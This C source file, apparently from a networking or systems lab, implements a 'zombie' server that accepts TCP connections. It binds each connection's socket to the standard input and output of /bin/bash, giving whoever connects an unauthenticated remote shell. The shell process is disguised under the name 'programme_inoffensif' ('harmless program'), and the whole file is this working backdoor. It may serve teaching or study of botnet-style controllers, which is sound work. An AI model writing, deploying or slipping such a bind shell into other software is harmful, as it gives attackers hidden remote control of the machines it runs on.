#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>
#include <string.h>

#include "utils_v2.h"
#include "info.h"
#include "reseau.h"

volatile sig_atomic_t end = 0;

void endZombieLabo(int sig){
    end = 1;
}

void zombieFils(void* sockfdController){
    int* sockfd = sockfdController;

    dup2(*sockfd, STDOUT_FILENO);
    dup2(*sockfd, STDERR_FILENO);
    dup2(*sockfd,STDIN_FILENO);
    sclose(*sockfd);
    sexecl("/bin/bash", "programme_inoffensif", NULL);
}

int main(int argc, char *argv[]){
    int sockfd;
    int port;

    ssigaction(SIGTERM,endZombieLabo);

    if(argc < 2){
        sockfd = initSocketZombie(0);
    }else{
        port = atoi(argv[1]);
        sockfd = initSocketZombie(port);
    }
    int i = 0;
    pid_t* pids_chils = malloc(NB_PORTS * sizeof(pid_t));
    int* sockfdController = smalloc(NB_PORTS*sizeof(int));

    for (int j = 0; j < NB_PORTS; j++) {
        sockfdController[j] = -1;
    }
    
    while(!end){
        sockfdController[i] = accept(sockfd, NULL, NULL);
        if(sockfdController[i] != -1){
            pids_chils[i] = fork_and_run1(zombieFils, &sockfdController[i]);
            i++;
        }else {
            break;
        }
    }
    for (int i = 0; i < NB_PORTS; i++)
    {
        skill(pids_chils[i],SIGTERM);
    }
    
    sclose(sockfd);
    free(pids_chils);
    free(sockfdController);
}